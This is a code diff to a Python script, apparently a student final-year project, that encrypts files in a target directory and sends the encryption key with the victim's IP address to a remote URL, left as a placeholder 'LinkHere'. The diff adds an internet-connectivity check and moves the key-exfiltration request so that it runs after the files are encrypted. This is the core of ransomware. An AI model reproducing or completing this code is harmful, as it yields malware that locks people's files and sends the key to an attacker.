@@ -5,6 +5,12 @@ from os import path
 from os import listdir
 from os.path import isfile, join
 
+#Internet connection initial test
+try:
+    testCon = requests.get("http://checkip.amazonaws.com/")
+except:
+    exit()
+
 #Desktop path
 targetDir = "/storage/emulated/0/AppProjects/Python3/FYP/Encrypted_Storage/"
 
@@ -26,12 +32,6 @@ for i in range(26):
 for i in range(10):
     finalKey += str(keyRaw_digit[i])  
             
-#Use http requests to store key, identity (IP addr)
-
-ipAddr = requests.get("http://checkip.amazonaws.com/")
-
-data = requests.get("linkhere" + finalKey + "&ip=" + ipAddr.text)
-
 #get file list in desktop
 targetFList = [f for f in listdir(targetDir) if isfile(join(targetDir, f))]
 
@@ -119,3 +119,13 @@ def validation(targetDir, targetFList):
             
             
 encryptContent()
+
+#Use http requests to store key, identity (IP addr)
+try:
+    ipAddr = requests.get("http://checkip.amazonaws.com/")
+
+    data = requests.get("LinkHere" + finalKey + "&ip=" + ipAddr.text)
+    
+except:
+	pass
+	
